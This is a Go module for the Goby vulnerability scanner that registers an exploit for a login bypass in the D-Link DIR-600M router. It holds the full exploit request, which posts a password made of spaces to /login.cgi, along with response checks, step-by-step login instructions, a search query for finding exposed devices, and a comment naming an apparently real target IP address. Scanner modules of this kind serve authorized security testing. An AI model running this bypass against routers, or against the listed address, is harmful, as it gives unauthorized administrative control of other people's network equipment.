package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "D-Link DIR-600M Wireless N 150 Login Page Bypass",
    "Description": "After Successfully Connected to D-Link DIR-600M Wireless N 150 Router(FirmWare Version : 3.04), Any User Can Easily Bypass The Router's Admin Panel Just by Feeding Blank Spaces in the password Field.",
    "Product": "D-Link DIR-600M",
    "Homepage": "http://www.dlink.co.in/products/?pid=DIR-600M",
    "DisclosureDate": "2021-05-29",
    "Author": "李大壮",
    "FofaQuery": "body=\"DIR-600M\"",
    "GobyQuery": "body=\"DIR-600M\"",
    "Level": "3",
    "Impact": "<p>Its More Dangerous when your Router has a public IP with remote login enabled.</p>",
    "Recommendation": "<p>Update Patches</p>",
    "References": [
        "https://www.exploit-db.com/exploits/42039"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "username=Admin&password=%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&submit.htm%3Flogin.htm=",
                "data_type": "text",
                "follow_redirect": false,
                "header": {
                    "Origin": "{{{fixedhostinfo}}}",
                    "Referer": "{{{fixedhostinfo}}}/login.htm"
                },
                "method": "POST",
                "uri": "/login.cgi"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.location.href",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "index.htm",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "username=Admin&password=%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&submit.htm%3Flogin.htm=",
                "data_type": "text",
                "follow_redirect": false,
                "header": {
                    "Origin": "{{{fixedhostinfo}}}",
                    "Referer": "{{{fixedhostinfo}}}/login.htm"
                },
                "method": "POST",
                "uri": "/login.cgi"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "window.location.href",
                        "variable": "$body"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "index.htm",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            },
            "SetVariable": [
                "output|define|variable|{{{fixedhostinfo}}}/login.htm\nUser: admin\nPwd: \"                          \"\nTip:\nStep 1: Go to\nRouter Login Page : {{{fixedhostinfo}}}/login.htm\nStep 2:Fill username: admin\nAnd in Password Fill more than 20 tims Spaces(\" \")"
            ]
        }
    ],
    "Tags": [
        "Arbitrary user login"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6828"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

// http://103.91.72.237:8080/index.htm
